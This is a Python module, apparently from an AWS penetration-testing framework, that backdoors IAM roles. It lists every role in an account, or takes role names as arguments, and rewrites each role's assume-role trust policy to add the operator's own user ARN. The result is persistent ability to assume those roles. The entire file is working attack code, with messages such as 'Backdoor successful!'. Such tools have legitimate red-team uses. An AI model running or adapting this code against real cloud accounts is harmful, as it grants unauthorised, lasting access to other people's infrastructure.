#!/usr/bin/env python3
#'description': ''This module creates a trust relationship between 
#one or more user accounts and one or more roles in the account, allowing those users to assume those roles.',

import datetime
import argparse
import json
from random import choice
from botocore.exceptions import ClientError

def main(args, awsattack_main, data=None):
    technique_info = data

    session = awsattack_main.get_active_session()
    print = awsattack_main.print
    key_info = awsattack_main.key_info
    fetch_data = awsattack_main.fetch_data
    get_aws_key_by_alias = awsattack_main.get_aws_key_by_alias
    ######

    client = awsattack_main.get_boto3_client('iam')

    rolenames = []
    user_arns = []
    summary_data = {}

    if args.role_names is None:
        print('Fetching Roles... ')
        if fetch_data(['IAM', 'Roles'], technique_info['prerequisite_modules'][0], '--roles') is False:
            print('Sub-module Execution Failed')
            print('  Exiting...')
            return
        for role in session.IAM['Roles']:
            rolenames.append(role['RoleName'])
        print('{} Role(s) Found'.format(len(session.IAM['Roles'])))
    else:
        rolenames = args.role_names.split(',')

    if args.user_arns is None:
        # Find out the current users ARN
        # This should be moved into the creds array in the "Arn" parameter for those set of keys that are running this module
        user = key_info()
        active_aws_key = get_aws_key_by_alias(session.key_alias)

        if 'Arn' not in user or user['Arn'] is None:
            client = awsattack_main.get_boto3_client('sts')
            user_info = client.get_caller_identity()
            active_aws_key.update(awsattack_main.database, arn=user_info['Arn'], user_id=user_info['UserId'], account_id=user_info['Account'])

        user_arns.append(active_aws_key.arn)
    else:
        if ',' in args.user_arns:
            user_arns.extend(args.user_arns.split(','))
        else:
            user_arns.append(args.user_arns)  # Only one ARN was passed in

    iam = awsattack_main.get_boto3_resource('iam')
    backdoored_role_count = 0

    print('Backdoor the following roles?')
    for rolename in rolenames:
        target_role = 'n'
        print('    Backdooring {}...'.format(rolename))
        try:
            role = iam.Role(rolename)
            original_policy = role.assume_role_policy_document
            hacked_policy = modify_assume_role_policy(original_policy, user_arns, args.no_random)
            client.update_assume_role_policy(
                RoleName=rolename,
                PolicyDocument=json.dumps(hacked_policy)
            )
            print('    Backdoor successful!')
            backdoored_role_count += 1
        except ClientError as error:
            print('      FAILURE:')
            code = error.response['Error']['Code']
            if code == 'UnmodifiableEntity':
                print('        SERVICE PROTECTED BY AWS')
            elif code == 'AccessDenied':
                print('        MISSING NEEDED PERMISSIONS')
            else:
                print('        {}'.format(code))
    summary_data['RoleCount'] = backdoored_role_count
    return summary_data


def modify_assume_role_policy(original_policy, user_arns, no_random):
    if 'Statement' in original_policy:
        statements = original_policy['Statement']

        for statement in statements:
            if 'Effect' in statement and statement['Effect'] == 'Allow':
                if 'Principal' in statement and isinstance(statement['Principal'], dict):
                    # Principals can be services, federated users, etc.
                    # 'AWS' signals a specific account based resource
                    # print(statement['Principal'])
                    if 'AWS' in statement['Principal']:
                        if isinstance(statement['Principal']['AWS'], list):
                            # If there are multiple principals, append to the list
                            if no_random:
                                for arn in user_arns:
                                    statement['Principal']['AWS'].append(arn)

                            else:
                                arn = choice(user_arns)
                                statement['Principal']['AWS'].append(arn)

                        else:
                            # If a single principal exists, make it into a list
                            statement['Principal']['AWS'] = [statement['Principal']['AWS']]
                            if no_random:
                                for arn in user_arns:
                                    statement['Principal']['AWS'].append(arn)

                            else:
                                arn = choice(user_arns)
                                statement['Principal']['AWS'].append(arn)

                    else:
                        # No account based principal principal exists
                        if no_random and len(user_arns) > 1:
                            statement['Principal']['AWS'] = []
                            for arn in user_arns:
                                statement['Principal']['AWS'].append(arn)

                        else:
                            arn = choice(user_arns)
                            statement['Principal']['AWS'] = arn

                elif 'Principal' not in statement:
                    # This shouldn't be possible, but alas, it is
                    if no_random and len(user_arns) > 1:
                            statement['Principal'] = {'AWS': []}
                            for arn in user_arns:
                                statement['Principal']['AWS'].append(arn)

                    else:
                        arn = choice(user_arns)
                        statement['Principal'] = {'AWS': arn}

    return original_policy  # now modified in line
